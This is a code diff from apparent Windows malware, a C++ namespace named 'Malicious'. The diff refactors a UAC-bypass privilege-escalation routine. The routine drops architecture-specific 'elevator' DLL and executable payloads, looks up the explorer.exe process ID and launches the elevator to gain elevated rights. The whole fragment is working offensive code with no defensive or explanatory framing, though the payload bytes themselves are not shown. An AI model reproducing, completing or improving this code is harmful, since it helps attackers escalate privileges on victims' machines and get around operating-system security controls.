@@ -29,22 +29,16 @@ namespace Malicious
 			    if(isUacActivated())
 			    {
 					LOG << "Trying privilege escalation";
-					BinaryRessource * elevatorDll = 0;
-					BinaryRessource * elevator = 0;
-					if(is64BitWindows())
-					{
-						LOG << "Windows 64bit detected";
-						elevatorDll = new BinaryRessource(ElevatorDll64, sizeof(ElevatorDll64), ELEVATOR_DLL_NAME, true);
-						elevator = new BinaryRessource(Elevator64, sizeof(Elevator64), ELEVATOR_EXE_NAME, true);
-					}
-					else
-					{
-						LOG << "Windows 32bit detected";
-						elevatorDll = new BinaryRessource(ElevatorDll32, sizeof(ElevatorDll32), ELEVATOR_DLL_NAME, true);
-						elevator = new BinaryRessource(Elevator32, sizeof(Elevator32), ELEVATOR_EXE_NAME, true);
-					}
+					bool is64 = is64BitWindows();
+					const unsigned char * elevatorDllPayload = is64 ? ElevatorDll64 : ElevatorDll32;
+					size_t elevatorDllPayloadSize = is64 ? sizeof(ElevatorDll64) : sizeof(ElevatorDll32);
 
-					LOG << "What is explorer.exe PID ?";
+					const unsigned char * elevatorPayload = is64 ? Elevator64 : Elevator32;
+					size_t elevatorPayloadSize = is64 ? sizeof(Elevator64) : sizeof(Elevator32);
+					
+					BinaryRessource elevatorDll(elevatorDllPayload, elevatorDllPayloadSize, ELEVATOR_DLL_NAME, true);
+					BinaryRessource elevator(elevatorPayload, elevatorPayloadSize, ELEVATOR_EXE_NAME, true);
+					
 					DWORD explorer_pid = System::Process::GetPidFromName(ELEVATOR_PROCESS_NAME);
 					if(explorer_pid)
 					{
@@ -66,10 +60,6 @@ namespace Malicious
 					System::Process::Launcher elevatorProcess(ELEVATOR_EXE_NAME, elevatorArguments);
 					LOG << "Waiting elevator to finish";
 					DWORD exitCode = elevatorProcess.wait();					
-
-					delete elevatorDll;
-					delete elevator;
-
 					return exitCode;
 			    }
 				break;
